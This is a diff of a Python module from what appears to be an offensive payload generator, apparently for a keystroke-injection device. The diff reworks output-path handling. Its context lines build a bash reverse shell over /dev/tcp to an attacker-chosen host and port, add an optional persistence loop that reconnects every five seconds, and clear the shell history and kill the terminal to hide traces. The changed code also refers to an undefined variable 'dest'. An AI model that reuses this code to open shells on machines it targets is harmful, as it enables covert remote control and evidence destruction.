@@ -33,32 +33,31 @@ class payload:
 			persistence = raw_input(h.info_question_raw("Make Persistent? (y/n): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
-				shell_clean = "history -wc;killall Terminal"
 				break
 			else:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
-				shell_clean = "history -wc;killall Terminal"
 				break
 		shell_command += "history -wc;killall Terminal"
 		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
-		if path[0] != '/':
-        	    path = os.environ['OLDPWD']+'/'+path
-    		else:
-        	    path = path
-		direct = os.path.split(path)[0]
-		if os.path.exists(direct):
-		    if os.path.isdir(direct):
-		        if os.path.isdir(path):
-			    h.info_error("Error: "+path+": is a directory!")
-			    exit
-			else:
-		            payload_save_path = path
+		if os.path.isdir(path):
+		    if os.path.exists(path):
+			if path[-1:] == "/":
+                             payload_save_path = path + "payload.txt"
+                        else:
+                             payload_save_path = path + "/payload.txt"
 		    else:
-			h.info_error("Error: "+direct+": not a directory!")
-			exit
+			h.info_error("Local directory: "+dest+": does not exist!")
 		else:
-		    h.info_error("Local directory: "+direct+": does not exist!")
-		    exit
+		    direct = os.path.split(path)[0]
+		    if os.path.exists(direct):
+		        if os.path.isdir(direct):
+		            payload_save_path = path
+		        else:
+			    h.info_error("Error: "+direct+": not a directory!")
+			    exit
+		    else:
+		        h.info_error("Local directory: "+direct+": does not exist!")
+		        exit
 			
 		payload = """\
 DELAY 500
